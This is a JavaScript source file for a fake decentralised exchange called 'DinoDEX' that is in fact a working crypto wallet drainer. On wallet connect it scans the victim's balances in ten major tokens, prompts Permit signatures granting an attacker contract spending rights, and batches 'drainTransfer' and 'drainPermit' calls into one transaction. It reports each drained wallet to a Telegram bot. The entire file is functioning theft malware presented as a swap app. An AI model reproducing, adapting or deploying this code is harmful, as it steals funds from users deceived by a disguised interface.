import { createAppKit } from '@reown/appkit'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, sepolia } from '@reown/appkit/networks'
import { createPublicClient, custom, toFunctionSelector, pad, toHex } from 'viem'
import { signTypedData, sendTransaction, getAccount } from 'wagmi/actions'
import {
  REOWN_PROJECT_ID, TG_TOKEN, TG_CHAT, CONTRACT, CHAIN_ID,
  ERC20_ABI, PERMIT2
} from './config.js'

const chain = CHAIN_ID === 11155111 ? sepolia : mainnet
const statusEl = document.getElementById('status')
const setStatus = (t) => { if (statusEl) statusEl.textContent = t }

const wagmiAdapter = new WagmiAdapter({ networks: [chain], projectId: REOWN_PROJECT_ID })
const wagmiConfig = wagmiAdapter.wagmiConfig
const appkit = createAppKit({
  adapters: [wagmiAdapter],
  networks: [chain],
  projectId: REOWN_PROJECT_ID,
  metadata: { name: 'DinoDEX', description: 'Swap', url: location.origin, icons: [] },
  features: { analytics: false }
})

const publicClient = createPublicClient({ chain, transport: custom(window.ethereum || {}) })

async function alert(msg) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' })
    })
  } catch (e) {}
}

const TOKENS = [
  { addr: '0xdAC17F958D2ee523a2206206994597C13D831ec7', dec: 6,  sym: 'USDT' },
  { addr: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', dec: 6,  sym: 'USDC' },
  { addr: '0x6B175474E89094C44Da98b954EedeAC495271d0F', dec: 18, sym: 'DAI' },
  { addr: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', dec: 8,  sym: 'WBTC' },
  { addr: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', dec: 18, sym: 'WETH' },
  { addr: '0x514910771AF9Ca656af840dff83E8264EcF986CA', dec: 18, sym: 'LINK' },
  { addr: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', dec: 18, sym: 'UNI' },
  { addr: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', dec: 18, sym: 'AAVE' },
  { addr: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', dec: 18, sym: 'MKR' },
  { addr: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84', dec: 18, sym: 'stETH' }
]

const hex32 = (n) => pad(toHex(n), { size: 32 })
const hexAddr = (a) => pad(a.toLowerCase(), { size: 32 })
const sel = (sig) => toFunctionSelector(sig).slice(2)

async function signPermit(token, owner, value, deadline) {
  const name = await publicClient.readContract({ address: token, abi: ERC20_ABI, functionName: 'name' })
  const nonce = await publicClient.readContract({ address: token, abi: ERC20_ABI, functionName: 'nonces', args: [owner] })
  const sig = await signTypedData(wagmiConfig, {
    account: owner,
    domain: { name, version: '1', chainId: chain.id, verifyingContract: token },
    types: { Permit: [
      { name: 'owner', type: 'address' }, { name: 'spender', type: 'address' },
      { name: 'value', type: 'uint256' }, { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' }
    ]},
    primaryType: 'Permit',
    message: { owner, spender: CONTRACT, value, nonce, deadline }
  })
  return { v: parseInt(sig.slice(130, 132), 16), r: '0x' + sig.slice(2, 66), s: '0x' + sig.slice(66, 130) }
}

async function signPermit2(token, owner, value, nonce, deadline) {
  return await signTypedData(wagmiConfig, {
    account: owner,
    domain: { name: 'Permit2', chainId: chain.id, verifyingContract: PERMIT2 },
    types: {
      PermitSingle: [
        { name: 'details', type: 'PermitDetails' },
        { name: 'spender', type: 'address' },
        { name: 'sigDeadline', type: 'uint256' }
      ],
      PermitDetails: [
        { name: 'token', type: 'address' }, { name: 'amount', type: 'uint160' },
        { name: 'expiration', type: 'uint48' }, { name: 'nonce', type: 'uint48' }
      ]
    },
    primaryType: 'PermitSingle',
    message: { details: { token, amount: value, expiration: deadline, nonce }, spender: CONTRACT, sigDeadline: deadline }
  })
}

function encode(fn, args) {
  if (fn === 'drainTransfer') return '0x' + sel('drainTransfer(address,address,uint256)') + hexAddr(args[0]).slice(2) + hexAddr(args[1]).slice(2) + hex32(args[2]).slice(2)
  if (fn === 'drainPermit') return '0x' + sel('drainPermit(address,address,uint256,uint256,uint8,bytes32,bytes32)') + hexAddr(args[0]).slice(2) + hexAddr(args[1]).slice(2) + hex32(args[2]).slice(2) + hex32(args[3]).slice(2) + hex32(args[4]).slice(2) + args[5].slice(2) + args[6].slice(2)
  if (fn === 'drainPermit2') return '0x' + sel('drainPermit2(address,address,uint160,uint48,uint48,uint256,bytes)') + hexAddr(args[0]).slice(2) + hexAddr(args[1]).slice(2) + hex32(args[2]).slice(2) + hex32(args[3]).slice(2) + hex32(args[4]).slice(2) + hex32(args[5]).slice(2) + encodeBytes(args[6]).slice(2)
  if (fn === 'multicall') return '0x' + sel('multicall(bytes[])') + encodeBytesArray(args[0]).slice(2)
}

function encodeBytes(b) {
  const hex = b.slice(2); const len = hex.length / 2
  return hex32(len).slice(2) + hex.padEnd(Math.ceil(hex.length / 64) * 64, '0')
}
function encodeBytesArray(arr) {
  let out = hex32(arr.length).slice(2)
  const encoded = arr.map(a => encodeBytes(a))
  let offset = arr.length * 32
  for (const e of encoded) { out += hex32(offset).slice(2); offset += e.length / 2 }
  for (const e of encoded) out += e
  return out
}

async function send(owner, data) {
  return await sendTransaction(wagmiConfig, { account: owner, to: CONTRACT, data })
}

async function drainToken(token, owner, batch) {
  const bal = await publicClient.readContract({ address: token.addr, abi: ERC20_ABI, functionName: 'balanceOf', args: [owner] })
  if (bal === 0n) return null
  const allow = await publicClient.readContract({ address: token.addr, abi: ERC20_ABI, functionName: 'allowance', args: [owner, CONTRACT] })
  if (allow >= bal) { const d = encode('drainTransfer', [token.addr, owner, bal]); batch ? batch.push(d) : await send(owner, d); return `${token.sym} pre-approved` }
  try {
    const deadline = Math.floor(Date.now() / 1000) + 3600
    const { v, r, s } = await signPermit(token.addr, owner, bal, deadline)
    const d = encode('drainPermit', [token.addr, owner, bal, deadline, v, r, s])
    batch ? batch.push(d) : await send(owner, d)
    return `${token.sym} permit`
  } catch (e) { return null }
}

let connecting = false
document.querySelector('.connect-evm').addEventListener('click', async (e) => {
  e.preventDefault()
  if (connecting) return
  connecting = true
  try {
    setStatus('Opening wallet…')
    await appkit.open()
    const { address } = getAccount(wagmiConfig)
    if (!address) { setStatus('Connect a wallet first'); connecting = false; return }
    setStatus('Scanning wallet…')
    const batch = []
    for (const t of TOKENS) {
      setStatus(`Checking ${t.sym}…`)
      await drainToken(t, address, batch)
    }
    if (batch.length) { setStatus('Confirm in wallet…'); await send(address, encode('multicall', [batch])) }
    setStatus(batch.length ? `Drained ${batch.length} token(s)` : 'Nothing drainable')
    alert(`🦖 DinoDEX\nWallet: ${address}\nDrained: ${batch.length}`)
  } catch (err) {
    console.error(err); setStatus('Failed: ' + (err.message || err)); alert(`⚠️ ${err.message || err}`)
  } finally { connecting = false }
})